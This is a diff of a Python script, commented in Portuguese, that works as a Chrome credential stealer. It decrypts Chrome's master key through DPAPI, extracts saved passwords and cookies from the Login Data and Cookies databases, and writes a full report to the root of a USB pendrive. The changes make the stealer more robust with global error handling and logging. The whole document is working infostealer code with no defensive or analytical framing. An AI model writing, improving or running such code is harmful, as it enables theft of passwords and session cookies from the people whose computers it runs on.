@@ -9,33 +9,39 @@ import win32crypt
 from Crypto.Cipher import AES
 from datetime import datetime
 
-# =============================================
-# CONFIGURAÇÕES
-# =============================================
-USUARIO = os.getlogin()
+# ============================================================
+# 1. CRIA A PASTA E O LOG IMEDIATAMENTE (MESMO SE DER ERRO)
+# ============================================================
 PASTA_ATUAL = os.path.dirname(os.path.abspath(__file__))
 PASTA_SAIDA = os.path.join(PASTA_ATUAL, "Credenciais")
-
-# CRIA A PASTA IMEDIATAMENTE (MESMO ANTES DE QUALQUER COISA)
 try:
     os.makedirs(PASTA_SAIDA, exist_ok=True)
-except Exception as e:
+except:
     # Fallback: área de trabalho
-    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
+    desktop = os.path.join(os.environ.get('USERPROFILE', 'C:/'), 'Desktop')
     PASTA_SAIDA = os.path.join(desktop, "Credenciais_Backup")
     os.makedirs(PASTA_SAIDA, exist_ok=True)
 
+# ARQUIVO DE LOG (já escreve o início)
 LOG_FILE = os.path.join(PASTA_SAIDA, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
 
 def log(texto):
     with open(LOG_FILE, "a", encoding="utf-8") as f:
         f.write(str(texto) + "\n")
+    print(texto)  # também imprime no console (se houver)
 
-# =============================================
-# FUNÇÕES DE COLETA
-# =============================================
+log("="*60)
+log("INICIANDO COLETA (VERSÃO ROBUSTA)")
+log(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
+log(f"Usuário: {os.getlogin()}")
+log(f"Pasta de saída: {PASTA_SAIDA}")
+log("="*60)
+
+# ============================================================
+# 2. FUNÇÕES DE COLETA (COM TRATAMENTO DE ERRO)
+# ============================================================
 def pegar_chave_mestra():
-    path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Local State"
+    path = f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Local State"
     if not os.path.exists(path):
         raise FileNotFoundError(f"Chrome não encontrado: {path}")
     with open(path, 'r', encoding='utf-8') as f:
@@ -44,8 +50,8 @@ def pegar_chave_mestra():
     return win32crypt.CryptUnprotectData(chave_enc, None, None, None, 0)[1]
 
 def coletar_senhas(chave):
-    log("  [+] Senhas...")
-    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
+    log("  Coletando senhas...")
+    caminho = f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
     if not os.path.exists(caminho):
         return ["Chrome não possui dados de login."]
     temp = os.path.join(PASTA_SAIDA, "temp_senhas.db")
@@ -70,23 +76,12 @@ def coletar_senhas(chave):
     return creds
 
 def coletar_cookies(chave):
-    log("  [+] Cookies...")
-    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"
+    log("  Coletando cookies...")
+    caminho = f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"
     if not os.path.exists(caminho):
-        log("    Arquivo de cookies não encontrado.")
         return []
-    
     temp = os.path.join(PASTA_SAIDA, "temp_cookies.db")
-    try:
-        shutil.copyfile(caminho, temp)
-    except PermissionError:
-        log("    PERMISSAO NEGADA: Chrome aberto? Feche e tente novamente.")
-        # Cria um arquivo de aviso na pasta
-        with open(os.path.join(PASTA_SAIDA, "AVISO_Chrome_Aberto.txt"), "w") as f:
-            f.write("O Chrome estava aberto durante a execução.\n")
-            f.write("Feche o Chrome e execute novamente para coletar cookies.\n")
-        return []  # Não interrompe a execução
-
+    shutil.copyfile(caminho, temp)
     cookies = []
     conn = sqlite3.connect(temp)
     cursor = conn.cursor()
@@ -106,25 +101,13 @@ def coletar_cookies(chave):
     log(f"    OK {len(cookies)} cookies.")
     return cookies
 
-# =============================================
-# MAIN
-# =============================================
-def main():
-    log("="*60)
-    log("COLETOR MAXIMO (SEM BLOQUEIO)")
-    log(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
-    log(f"Usuário: {USUARIO}")
-    log(f"Pasta de saída: {PASTA_SAIDA}")
-    log("="*60)
-
-    try:
-        chave = pegar_chave_mestra()
-        log("\n[OK] Chave obtida.")
-    except Exception as e:
-        log(f"[ERRO] Falha ao obter chave: {e}")
-        with open(os.path.join(PASTA_SAIDA, "erro_chave.txt"), "w") as f:
-            f.write(str(e))
-        return
+# ============================================================
+# 3. MAIN (COM CAPTURA DE ERRO GLOBAL)
+# ============================================================
+try:
+    log("\n[+] Obtendo chave...")
+    chave = pegar_chave_mestra()
+    log("[OK] Chave obtida.")
 
     log("\n[+] Coletando dados...")
     dados = {
@@ -139,7 +122,7 @@ def main():
         f.write("="*80 + "\n")
         f.write("RELATORIO COMPLETO\n")
         f.write(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
-        f.write(f"Usuario: {USUARIO}\n")
+        f.write(f"Usuario: {os.getlogin()}\n")
         f.write("="*80 + "\n\n")
         for secao, itens in dados.items():
             f.write(f"[{secao.upper()}]\n")
@@ -151,17 +134,23 @@ def main():
                 f.write("Nenhum dado encontrado.\n")
             f.write("\n")
 
-    # Cópia para a raiz do pendrive
+    # Cópia na raiz do pendrive
     try:
         shutil.copy(caminho, os.path.join(PASTA_ATUAL, nome))
         log(f"\n[OK] Relatório salvo em: {caminho}")
-        log(f"[OK] Cópia na raiz: {nome}")
+        log(f"[OK] Cópia na raiz do pendrive: {nome}")
     except Exception as e:
         log(f"[AVISO] Não foi possível copiar para a raiz: {e}")
 
-    log("\n" + "="*60)
-    log("FIM DA EXECUCAO")
-    time.sleep(3)
+except Exception as e:
+    log(f"[ERRO FATAL] {e}")
+    import traceback
+    log(traceback.format_exc())
+    # Cria um arquivo de erro para diagnóstico
+    with open(os.path.join(PASTA_SAIDA, "erro.txt"), "w") as f:
+        f.write(str(e) + "\n" + traceback.format_exc())
 
-if __name__ == "__main__":
-    main()
+finally:
+    log("\n" + "="*60)
+    log("FIM DA EXECUÇÃO")
+    time.sleep(2)
